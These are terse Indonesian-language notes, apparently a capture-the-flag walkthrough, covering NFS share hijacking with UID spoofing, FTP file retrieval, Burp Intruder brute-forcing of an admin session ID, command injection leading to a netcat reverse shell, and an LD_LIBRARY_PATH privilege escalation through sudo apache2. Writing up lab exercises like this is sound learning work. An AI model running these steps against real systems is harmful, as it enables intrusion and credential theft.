# boot:
1. scan ftp ssh http nfs kebuka 
2. showmount -e ip -> catet path yg kebuka
3. mkdir hijack_mount -> sudo mount -t nfs ip:dir_yg_kebuka /hijack_mount
4. bakal error di masukin ls -la aja -> denied gitu
5. sudo useradd sebus -> sudo passwd sebus -> vim /etc/passwd -> ganti user baru id jadi 1003 
6. su sebus -> masuk situ dah cat aja cred nya
7. mount | grep nfs -> sudo umount ip:path_nfs -> cek lagi
8. sudo userdel namanya -> cat /etc/passwd | grep namanya
9. masuk ftp -> ls -la -> get .filenya 
10. ada wordlist passwd keknya -> target sih ke dashboard admin yg denied -> signup dulu aja -> ke admin -> intruder phpsessionID nya belakang %6%6 ok
11. kasih rule di intruder burp nya -> prefix: "admin:", hash: md5, encode: base64
12. susah bjir -> session id udah masuk masukin ke repeater aja biar enak -> coba ketik ftp di inputnya
13. ftp && bash -c 'revshell' -> encode aja ctrl + u semuanya -> pastiin sess id nya admin -> nc masuk shell
14. di config.php coba cat -> ada cred disitu -> bisa buka mysql atau su aja lgsg ke usernya
15. klaim user flag -> sudo -l 

# pe: 
1. buat exp nya -> wget aja 
2. gcc -o /tmp/libcrypt.so.1 -shared -fPIC exp.c
3. sudo LD_LIBRARY_PATH=/tmp [sudo -l nya]  /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
